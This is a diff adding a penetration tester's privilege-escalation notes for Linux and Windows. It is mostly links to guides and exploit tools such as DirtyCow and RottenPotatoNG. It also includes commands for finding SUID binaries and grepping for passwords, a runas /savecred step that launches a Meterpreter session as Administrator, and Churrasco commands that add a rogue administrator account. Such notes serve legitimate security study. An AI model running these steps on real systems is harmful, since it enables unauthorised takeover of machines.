@@ -1,0 +1,59 @@
+https://guif.re/linuxeophttps://guif.re/windowseop
+https://netsec.ws/?p=337
+http://asystemengineersnotebook.blogspot.com/2017/07/a-dirty-privilege-escalation-trick.html
+
+https://hackmag.com/security/reach-the-root/
+
+grep -Ri 'password' .
+find / -perm –4000 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html
+
+Windows
+
+So from the Windows cmd shell (through telnet) type "runas /user:ACCESS\Administrator /savecred" as per above file contents THEN, paste the metaploit PSH code AFTER this and it will pop a meterpreter sessions as Administrator.
+
+https://github.com/GDSSecurity/Windows-Exploit-Suggester
+http://www.fuzzysecurity.com/tutorials/16.html
+http://pwnwiki.io/#!privesc/windows/index.md
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html?m=1
+https://pentestlab.blog/2017/04/19/stored-credentials/
+
+c:\Inetpub>churrasco
+ churrasco
+ /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+ c:\Inetpub>churrasco -d "net user /add <username> <password>"
+ c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
+ c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
+
+
+Linux
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://github.com/rebootuser/LinEnum
+http://pwnwiki.io/#!privesc/linux/index.md
+https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
+http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
+https://touhidshaikh.com/blog/?p=790
+https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html
+https://github.com/pentestmonkey/unix-privesc-check
+
+Enumeration Scripts:
+https://github.com/rebootuser/LinEnum
+https://github.com/pentestmonkey/unix-privesc-check
+https://github.com/sleventyeleven/linuxprivchecker
+https://github.com/DominicBreuker/pspy
+
+
+
+
+Binaries:
+Linux:
+https://github.com/FireFart/dirtycowhttps://github.com/dirtycow/dirtycow.github.io
+Windows:
+https://github.com/breenmachine/RottenPotatoNG
+
+
+
